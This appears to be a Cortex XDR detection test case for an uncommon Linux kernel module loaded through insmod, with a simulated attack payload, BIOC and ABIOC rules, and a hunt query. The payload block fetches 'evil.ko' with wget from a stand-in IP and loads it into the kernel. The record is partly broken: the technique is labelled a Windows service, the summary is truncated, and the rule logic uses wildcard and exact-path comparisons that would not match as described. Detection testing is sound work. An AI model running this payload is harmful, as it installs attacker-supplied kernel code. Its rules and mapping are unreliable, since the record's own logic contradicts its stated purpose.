identity.name: Uncommon Kernel Module Load via insmod
identity.summary: An attacker loads an uncommon kernel module using insmod to gain rootkit capabilities, which triggers the 'Uncommon kernel module load' ABIOC. Cortex should detect the execution of insmod with a suspi
identity.description: An attacker loads an uncommon kernel module using insmod to gain rootkit capabilities, which triggers the 'Uncommon kernel module load' ABIOC. Cortex should detect the execution of insmod with a suspicious module path and the subsequent process behavior.

techniques.name: Create or Modify System Process: Windows Service

payload.code:
wget -O /tmp/evil.ko http://192.0.2.5/evil.ko
chmod +x /tmp/evil.ko
insmod /tmp/evil.ko
lsmod | grep evil

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Uncommon Kernel Module Load
biocs.description: Detection of insmod being used with a non-standard or uncommon kernel module path
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'insmod'
| filter action_file_path != '/lib/modules/*'
| filter action_file_path != '/usr/lib/modules/*'

abiocs.name: Kernel Module Load Behavior
abiocs.description: Behavioral deviation from standard insmod usage patterns, such as loading modules from non-standard paths
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'insmod'
| filter action_file_path not in ('/lib/modules/', '/usr/lib/modules/')
abiocs.causality_anchor: insmod process start with non-standard module path

xql_queries.name: Kernel Module Load Hunt
xql_queries.query:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'insmod'
| filter action_file_path not in ('/lib/modules/', '/usr/lib/modules/')
